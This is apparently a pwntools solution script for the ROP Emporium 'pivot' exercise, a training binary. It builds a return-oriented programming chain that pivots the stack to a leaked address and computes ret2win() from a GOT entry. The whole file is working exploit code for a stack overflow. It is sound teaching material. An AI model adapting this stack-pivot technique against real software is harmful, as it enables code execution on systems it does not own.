from pwn import *
import sys

binary = './pivot'
if len(sys.argv) == 2:
    r = gdb.debug([binary], '''
    b *0x4009a7
    ''')
else:
    r = process([binary])

pop_rax = 0x4009bb
xchg_rax_rsp = 0x4009bd
set_rax_from_rax = 0x4009c0
add_rax_rbp = 0x4009c4
pop_rdi = 0x400a33
ret_addr = 0x4009c7
jmp_rax = 0x4007c1

foothold_addr = 0x400720
got_foothold_addr_at = 0x601040

ret2win_offset_from_foothold = 0xa81 - 0x96a

r.recvuntil('place to pivot: ')
pivot_addr = r.recvuntil('\nSend a ROP', drop=True)
pivot_addr = int(pivot_addr, 16)

# Stored chain to pivot to
chain = p64(foothold_addr) # load .got.plt with foothold_function address
chain += p64(pop_rax) + p64(got_foothold_addr_at)
chain += p64(set_rax_from_rax) # load foothold real address
chain += p64(add_rax_rbp) # add offset to foothold real address (set rax to ret2win)
chain += p64(jmp_rax) # goto ret2win()

r.sendline(chain)

# Kick off chain
chain = p64(pop_rax) + p64(pivot_addr)
chain += p64(xchg_rax_rsp)

rbp = p64(ret2win_offset_from_foothold)
payload = 'A' * (cyclic_find('kaaalaaa') - len(rbp)) + rbp + chain
r.sendline(payload)


r.interactive()

